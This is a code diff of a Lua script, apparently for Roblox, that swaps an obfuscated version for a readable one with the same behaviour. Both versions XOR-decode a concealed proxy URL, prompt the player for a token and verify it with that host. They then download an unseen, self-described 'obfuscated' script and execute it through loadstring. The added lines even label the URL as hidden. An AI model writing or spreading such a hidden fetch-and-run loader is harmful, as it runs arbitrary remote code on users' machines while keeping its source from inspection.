@@ -1,68 +1,138 @@
-local function _0xdec(_0xstr,_0xkey) local _0xout="" for _0xi=1,#_0xstr do local _0xc=string.byte(_0xstr,_0xi) local _0xk=string.byte(_0xkey,((_0xi-1)%#_0xkey)+1) _0xout=_0xout..string.char(_0xc~_0xk) end return _0xout end
-local _0xurl=_0xdec("\x1e\x12\x0c\x1d\x0a\x06\x17\x1c\x0c\x0d\x0b\x1d\x11\x0c\x0e\x1e\x07\x08\x1d\x08\x0d\x1a\x0d\x07\x1d\x08\x0b\x0c\x03","\x6b\x79")
-local _0xpl=game:GetService("Players").LocalPlayer
-local _0xt=_G.USER_TOKEN
-if not _0xt then
-    local _0xg=Instance.new("ScreenGui")
-    _0xg.Name="TokenPrompt"
-    _0xg.Parent=_0xpl.PlayerGui
-    local _0xf=Instance.new("Frame")
-    _0xf.Size=UDim2.new(0,320,0,160)
-    _0xf.Position=UDim2.new(0.5,-160,0.5,-80)
-    _0xf.BackgroundColor3=Color3.fromRGB(25,25,35)
-    _0xf.BorderSizePixel=0
-    _0xf.ClipsDescendants=true
-    _0xf.Parent=_0xg
-    local _0xl=Instance.new("TextLabel")
-    _0xl.Size=UDim2.new(1,0,0,30)
-    _0xl.Position=UDim2.new(0,0,0,10)
-    _0xl.Text="Enter proxy token:"
-    _0xl.TextColor3=Color3.new(1,1,1)
-    _0xl.BackgroundTransparency=1
-    _0xl.Font=Enum.Font.GothamBold
-    _0xl.TextSize=18
-    _0xl.TextScaled=false
-    _0xl.Parent=_0xf
-    local _0xtb=Instance.new("TextBox")
-    _0xtb.Size=UDim2.new(1,-40,0,35)
-    _0xtb.Position=UDim2.new(0,20,0,45)
-    _0xtb.PlaceholderText="Type token here..."
-    _0xtb.Text=""
-    _0xtb.BackgroundColor3=Color3.fromRGB(50,50,65)
-    _0xtb.TextColor3=Color3.new(1,1,1)
-    _0xtb.Font=Enum.Font.Gotham
-    _0xtb.TextSize=16
-    _0xtb.ClearTextOnFocus=false
-    _0xtb.Parent=_0xf
-    local _0xbtn=Instance.new("TextButton")
-    _0xbtn.Size=UDim2.new(0,120,0,40)
-    _0xbtn.Position=UDim2.new(0.5,-60,0,100)
-    _0xbtn.Text="Submit"
-    _0xbtn.BackgroundColor3=Color3.fromRGB(70,130,255)
-    _0xbtn.TextColor3=Color3.new(1,1,1)
-    _0xbtn.Font=Enum.Font.GothamBold
-    _0xbtn.TextSize=18
-    _0xbtn.Parent=_0xf
-    local _0xsub=false
-    _0xbtn.MouseButton1Click:Connect(function()
-        if _0xtb.Text~=""then _0xt=_0xtb.Text _0xsub=true else _0xl.Text="Cannot be empty!" _0xl.TextColor3=Color3.fromRGB(255,80,80) wait(1.5) _0xl.Text="Enter proxy token:" _0xl.TextColor3=Color3.new(1,1,1) end
-    end)
-    _0xtb.FocusLost:Connect(function(_0xenter)
-        if _0xenter and _0xtb.Text~=""then _0xt=_0xtb.Text _0xsub=true end
-    end)
-    repeat wait(0.1) until _0xsub or not _0xg.Parent
-    if not _0xg.Parent then _0xpl:Kick("wrong token bucko") return end
-    _0xg:Destroy()
+-- Decoder function for the hidden URL
+local function decode(str, key)
+    local out = ""
+    for i = 1, #str do
+        local c = string.byte(str, i)
+        local k = string.byte(key, ((i - 1) % #key) + 1)
+        out = out .. string.char(c ~ k)
+    end
+    return out
 end
-local function _0xenc(_0xstr) return _0xstr:gsub("%%","%%25") end
-local _0xtok=_0xenc(_0xt)
-local _0xv=_0xurl.."/verify?token=".._0xtok
-local _0xok,_0xresp=pcall(function() return game:HttpGet(_0xv) end)
-if not _0xok or _0xresp~="valid" then _0xpl:Kick("wrong token bucko") return end
-_G.USER_TOKEN=_0xt
-local _0xm=_0xurl.."/?token=".._0xtok
-local _0xscr,_0xerr=pcall(function() return game:HttpGet(_0xm) end)
-if not _0xscr then error("Failed to fetch script: "..tostring(_0xerr)) end
-local _0xfn,_0xle=loadstring(_0xerr)
-if not _0xfn then error("Loadstring error: "..tostring(_0xle)) end
-_0xfn()
+
+-- Hidden Vercel URL (XOR‑encoded)
+local PROXY_URL = decode(
+    "\x1e\x12\x0c\x1d\x0a\x06\x17\x1c\x0c\x0d\x0b\x1d\x11\x0c\x0e\x1e\x07\x08\x1d\x08\x0d\x1a\x0d\x07\x1d\x08\x0b\x0c\x03",
+    "\x6b\x79"
+)
+
+local player = game:GetService("Players").LocalPlayer
+local token = _G.USER_TOKEN
+
+-- If no saved token, show GUI prompt
+if not token then
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "TokenPrompt"
+    gui.Parent = player.PlayerGui
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 320, 0, 160)
+    frame.Position = UDim2.new(0.5, -160, 0.5, -80)
+    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    frame.BorderSizePixel = 0
+    frame.ClipsDescendants = true
+    frame.Parent = gui
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 0, 30)
+    label.Position = UDim2.new(0, 0, 0, 10)
+    label.Text = "Enter proxy token:"
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.GothamBold
+    label.TextSize = 18
+    label.Parent = frame
+
+    local textbox = Instance.new("TextBox")
+    textbox.Size = UDim2.new(1, -40, 0, 35)
+    textbox.Position = UDim2.new(0, 20, 0, 45)
+    textbox.PlaceholderText = "Type token here..."
+    textbox.Text = ""
+    textbox.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
+    textbox.TextColor3 = Color3.new(1, 1, 1)
+    textbox.Font = Enum.Font.Gotham
+    textbox.TextSize = 16
+    textbox.ClearTextOnFocus = false
+    textbox.Parent = frame
+
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0, 120, 0, 40)
+    button.Position = UDim2.new(0.5, -60, 0, 100)
+    button.Text = "Submit"
+    button.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.Font = Enum.Font.GothamBold
+    button.TextSize = 18
+    button.Parent = frame
+
+    local submitted = false
+
+    button.MouseButton1Click:Connect(function()
+        if textbox.Text ~= "" then
+            token = textbox.Text
+            submitted = true
+        else
+            label.Text = "Cannot be empty!"
+            label.TextColor3 = Color3.fromRGB(255, 80, 80)
+            wait(1.5)
+            label.Text = "Enter proxy token:"
+            label.TextColor3 = Color3.new(1, 1, 1)
+        end
+    end)
+
+    textbox.FocusLost:Connect(function(enterPressed)
+        if enterPressed and textbox.Text ~= "" then
+            token = textbox.Text
+            submitted = true
+        end
+    end)
+
+    while not submitted and gui.Parent do
+        wait(0.1)
+    end
+
+    if not gui.Parent then
+        player:Kick("wrong token bucko")
+        return
+    end
+
+    gui:Destroy()
+end
+
+-- Encode the token for URL (escape %)
+local function urlEncode(str)
+    return str:gsub("%%", "%%25")
+end
+
+local encodedToken = urlEncode(token)
+
+-- Verify token with the proxy
+local verifyURL = PROXY_URL .. "/verify?token=" .. encodedToken
+local success, response = pcall(function()
+    return game:HttpGet(verifyURL)
+end)
+
+if not success or response ~= "valid" then
+    player:Kick("wrong token bucko")
+    return
+end
+
+-- Save token for future runs
+_G.USER_TOKEN = token
+
+-- Fetch the main obfuscated script
+local mainURL = PROXY_URL .. "/?token=" .. encodedToken
+local scriptSuccess, scriptContent = pcall(function()
+    return game:HttpGet(mainURL)
+end)
+
+if not scriptSuccess then
+    error("Failed to fetch script: " .. tostring(scriptContent))
+end
+
+local scriptFn, loadErr = loadstring(scriptContent)
+if not scriptFn then
+    error("Loadstring error: " .. tostring(loadErr))
+end
+
+-- Execute the main script
+scriptFn()
